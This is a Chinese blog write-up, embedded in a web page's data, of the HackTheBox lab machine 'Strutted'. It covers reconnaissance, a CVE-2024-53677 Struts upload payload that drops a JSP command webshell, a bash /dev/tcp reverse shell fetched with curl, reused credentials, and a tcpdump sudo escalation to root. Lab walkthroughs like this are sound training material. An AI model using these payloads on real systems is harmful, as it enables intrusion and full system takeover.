<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/fe57c22d60846192.css" as="style"/><link rel="stylesheet" href="/_next/static/css/fe57c22d60846192.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/dBQk6Abu1BTL_HTUVLMvN/_buildManifest.js" defer=""></script><script src="/_next/static/dBQk6Abu1BTL_HTUVLMvN/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Strutted","contentHtml":"\u003ch1\u003eMachine - Strutted\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Strutted\"\u003ehttps://app.hackthebox.com/machines/Strutted\u003c/a\u003e | \u003ccode\u003eLinux\u003c/code\u003e | Medium\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Strutted nmap -sT -min-rate 5000 10.10.11.59              \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 21:26 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.59\nHost is up (0.080s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0.49 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Strutted nmap -sT -A -p 22,80 10.10.11.59\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 21:27 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.59\nHost is up (0.066s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://strutted.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   97.21 ms 10.10.16.1\n2   52.26 ms 10.10.11.59\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 11.65 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没扫描出来什么，\u003ccode\u003e80\u003c/code\u003e端口开始\u003c/p\u003e\n\u003ch2\u003eWeb\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e，上来就是一个上传功能点，并且是使用 \u003ccode\u003eJava\u003c/code\u003e 写的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传一张 \u003ccode\u003epng\u003c/code\u003e 图片，上传后访问上传后的路径\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e路径大概就是 \u003ccode\u003e/uploads/\u0026#x3C;日期\u003e_\u0026#x3C;时间戳\u003e/Image\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e右上角的 \u003ccode\u003eDownload\u003c/code\u003e 能下载一个压缩包文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解压后从这几个文件名来看，这是一个基于 \u003ccode\u003eTomcat\u003c/code\u003e （很可能还用到了 \u003ccode\u003eStruts\u003c/code\u003e 框架）的 Java Web 工程目录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从 \u003ccode\u003etomcat-users.xml\u003c/code\u003e 中能得到一个用户 \u003ccode\u003eadmin:skqKY6360z!Y\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?xml version=\u003cspan class=\"hljs-string\"\u003e'1.0'\u003c/span\u003e encoding=\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e?\u003e\n\n\u0026#x3C;tomcat-users\u003e\n    \u0026#x3C;role rolename=\u003cspan class=\"hljs-string\"\u003e\"manager-gui\"\u003c/span\u003e/\u003e\n    \u0026#x3C;role rolename=\u003cspan class=\"hljs-string\"\u003e\"admin-gui\"\u003c/span\u003e/\u003e\n    \u0026#x3C;user username=\u003cspan class=\"hljs-string\"\u003e\"admin\"\u003c/span\u003e password=\u003cspan class=\"hljs-string\"\u003e\"skqKY6360z!Y\"\u003c/span\u003e roles=\u003cspan class=\"hljs-string\"\u003e\"manager-gui,admin-gui\"\u003c/span\u003e/\u003e\n\u0026#x3C;/tomcat-users\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eDockerfile\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eFROM --platform=linux/amd64 openjdk:17-jdk-alpine\n\u003cspan class=\"hljs-comment\"\u003e#FROM openjdk:17-jdk-alpine\u003c/span\u003e\n\nRUN apk add --no-cache maven\n\nCOPY strutted /tmp/strutted\nWORKDIR /tmp/strutted\n\nRUN mvn clean package\n\nFROM tomcat:9.0\n\nRUN \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -rf /usr/local/tomcat/webapps/\nRUN \u003cspan class=\"hljs-built_in\"\u003emv\u003c/span\u003e /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/\nRUN \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e -rf /usr/local/tomcat/webapps/ROOT\n\nCOPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war\nCOPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml\nCOPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml\n\nEXPOSE 8080\n\nCMD [\u003cspan class=\"hljs-string\"\u003e\"catalina.sh\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"run\"\u003c/span\u003e]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 \u003ccode\u003estrutted\\src\\main\\resources\u003c/code\u003e 中能找到 \u003ccode\u003estruts.xml\u003c/code\u003e ，那么该应用确定使用了 \u003ccode\u003eApache struts\u003c/code\u003e 框架\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003ecursor\u003c/code\u003e 分析了一波：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这是一个图片上传和分享服务，允许用户上传图片并获得可分享的短链接\n支持\u003ccode\u003eJPG\u003c/code\u003e、\u003ccode\u003eJPEG\u003c/code\u003e、\u003ccode\u003ePNG\u003c/code\u003e和\u003ccode\u003eGIF\u003c/code\u003e格式的图片\n使用Java开发，基于\u003ccode\u003eApache Struts 2\u003c/code\u003e框架（版本\u003ccode\u003e6.3.0.1\u003c/code\u003e）\n使用\u003ccode\u003eSQLite\u003c/code\u003e数据库存储\u003ccode\u003eURL\u003c/code\u003e映射信息\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e检索 \u003ccode\u003eStruts\u003c/code\u003e 的公开漏洞发现存在一个严重的漏洞 \u003cstrong\u003eCVE-2024-53677\u003c/strong\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eCVE-2024-53677\u003c/strong\u003e\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e网上现在很多的资料：\u003ca href=\"https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/\"\u003ehttps://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/\u003c/a\u003e | 其中\u003ccode\u003ePOC\u003c/code\u003e在这里找到的：\u003ca href=\"https://blog.csdn.net/hcja666/article/details/145431770\"\u003ehttps://blog.csdn.net/hcja666/article/details/145431770\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e通过\u003ccode\u003ePOC\u003c/code\u003e上传文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e------geckoformboundary4326f830a192485d2f8c0ae8e591b119\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"Upload\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"1.gif\"\u003c/span\u003e\nContent-Type: image/gif\n\nGIF89a;\n\u0026#x3C;%@ page import=\u003cspan class=\"hljs-string\"\u003e\"java.io.*\"\u003c/span\u003e%\u003e\n\u0026#x3C;%\n out.print(\u003cspan class=\"hljs-string\"\u003e\"Hello\u0026#x3C;/br\u003e\"\u003c/span\u003e);\n String strcmd=request.getParameter(\u003cspan class=\"hljs-string\"\u003e\"cmd\"\u003c/span\u003e);\n String line=null;\n Process p=Runtime.getRuntime().\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(strcmd);\n BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\n \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e((line=br.readLine())!=null){\n out.print(line+\u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;/br\u003e\"\u003c/span\u003e);\n }\n%\u003e\n------geckoformboundary4326f830a192485d2f8c0ae8e591b119\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"upload\"\u003c/span\u003e;name=\u003cspan class=\"hljs-string\"\u003e\"top.UploadFileName\"\u003c/span\u003e;\n\n../test.jsp\n------geckoformboundary4326f830a192485d2f8c0ae8e591b119\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以发现图片的访问路径变成了：\u003ccode\u003euploads/20250602_143716/../../test.jsp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问上传的\u003ccode\u003eWebShell\u003c/code\u003e ，成功执行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e反弹 Shell\u003c/h3\u003e\n\u003cp\u003e这里构造麻烦了\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e首先创建反弹\u003ccode\u003eshell\u003c/code\u003e的脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.45/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过 \u003ccode\u003eWebShell\u003c/code\u003e 下载并保存到 \u003ccode\u003e/tmp/shell.sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eGET /test.jsp?cmd=curl+10.10.16.45%2Fshell.sh+-o+%2Ftmp%2Fshell.sh HTTP/1.1\nHost: strutted.htb\nAccept-Encoding: gzip, deflate\nCookie: JSESSIONID=67A2B86E62E77A8267883495A2D05A7E\nPriority: u=0, i\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nUpgrade-Insecure-Requests: 1\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nReferer: http://strutted.htb/test.jsp?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E\u0026#x26;%20/dev/tcp/10.10.16.45/1234%200%3E\u0026#x26;1%27\nDNT: 1\nSec-GPC: 1\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e赋予权限 \u0026#x26; 监听 \u0026#x26; 执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enc -lvp 1234\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e%20+x%20%2Ftmp%2Fshell.sh\n%2Fbin%2Fbash+%2Ftmp%2Fshell.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后就能接收到 \u003ccode\u003eShell\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003cp\u003e拿到 \u003ccode\u003eshell\u003c/code\u003e 后，找一些有用的信息\u003c/p\u003e\n\u003cp\u003e从 \u003ccode\u003etomcat-users.xml\u003c/code\u003e 得到一个新密码 \u003ccode\u003eIT14d6SSP81k\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eser username=\u003cspan class=\"hljs-string\"\u003e\"admin\"\u003c/span\u003e password=\u003cspan class=\"hljs-string\"\u003e\"IT14d6SSP81k\"\u003c/span\u003e roles=\u003cspan class=\"hljs-string\"\u003e\"manager-gui,admin-gui\"\u003c/span\u003e/\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e端口监听信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003etomcat@strutted:~/conf$ ss -tulpn\nNetid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process\nudp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*\nudp    UNCONN  0       0                    0.0.0.0:68            0.0.0.0:*\ntcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*\ntcp    LISTEN  0       511                  0.0.0.0:80            0.0.0.0:*\ntcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*\ntcp    LISTEN  0       100       [::ffff:127.0.0.1]:8080                *:*      \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e:((\"java\",pid=\u003cspan class=\"hljs-number\"\u003e1012\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e))\ntcp    LISTEN  0       128                     [::]:22               [::]:*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e下一个用户应该就是 \u003ccode\u003ejames\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003etomcat@strutted:~/conf$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /home\njames\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们尝试使用刚刚得到的密码进行登录\u003c/p\u003e\n\u003cp\u003e意外的成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Strutted ssh james@10.10.11.59\njames@10.10.11.59\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Mon Jun  2 02:59:38 PM UTC 2025\n\n  System load:           0.0\n  Usage of /:            69.4% of 5.81GB\n  Memory usage:          9%\n  Swap usage:            0%\n  Processes:             219\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.59\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:60d8\n\n * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s\n   just raised the bar for easy, resilient and secure K8s cluster deployment.\n\n   https://ubuntu.com/engage/secure-kubernetes-at-the-edge\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\n5 additional security updates can be applied with ESM Apps.\nLearn more about enabling ESM Apps service at https://ubuntu.com/esm\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Jun  2 14:59:38 2025 from 10.10.16.45\nTo run a command as administrator (user \"root\"), use \"sudo \u0026#x3C;command\u003e\".\nSee \"man sudo_root\" for details.\n\njames@strutted:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e家目录下能拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejames@strutted:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n523654eb64985132ab25397feda089ed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejames@strutted:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e james on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser james may run the following commands on localhost:\n    (ALL) NOPASSWD: /usr/sbin/tcpdump\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e以及结束了，利用链接：\u003ca href=\"https://gtfobins.github.io/gtfobins/tcpdump/\"\u003ehttps://gtfobins.github.io/gtfobins/tcpdump/\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eCOMMAND=\u003cspan class=\"hljs-string\"\u003e'cp /bin/bash /tmp/bash;chmod +s /tmp/bash;'\u003c/span\u003e\nTF=$(\u003cspan class=\"hljs-built_in\"\u003emktemp\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$COMMAND\u003c/span\u003e\"\u003c/span\u003e \u003e \u003cspan class=\"hljs-variable\"\u003e$TF\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x \u003cspan class=\"hljs-variable\"\u003e$TF\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e tcpdump -\u003cspan class=\"hljs-built_in\"\u003eln\u003c/span\u003e -i lo -w /dev/null -W 1 -G 1 -z \u003cspan class=\"hljs-variable\"\u003e$TF\u003c/span\u003e -Z root\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejames@strutted:/tmp$ ./bash -p\nbash-5.1# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(james) gid=1000(james) euid=0(root) egid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root),27(\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e),1000(james)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebash-5.1# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n1db28e82bbd377c60d86c4992aa8ec87\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eWeb\u003c/code\u003e通过\u003ccode\u003eCVE-2024-53677\u003c/code\u003e 进行梭哈，其实对我这种对\u003ccode\u003eJAVA\u003c/code\u003e不熟悉的人，看项目都一脸懵，通过\u003ccode\u003ecursor\u003c/code\u003e来检索出来了重要的信息（\u003ccode\u003eStucts\u003c/code\u003e的版本），找 \u003ccode\u003ePayload\u003c/code\u003e 的时间也挺长的…\u003c/p\u003e\n\u003cp\u003e提权更简单，一键梭哈\u003c/p\u003e\n\u003cp\u003e总的来说，像是披着\u003ccode\u003eMedium\u003c/code\u003e的\u003ccode\u003eEsay\u003c/code\u003e\u003c/p\u003e","title":"HackTheBox - Machine - Strutted","date":"2025-06-02","updated":"2025-06-02","tags":["HackTheBox","Linux","Struct","TCPdump"],"categories":"靶机","comments":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxMachine - Strutted"},"buildId":"dBQk6Abu1BTL_HTUVLMvN","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>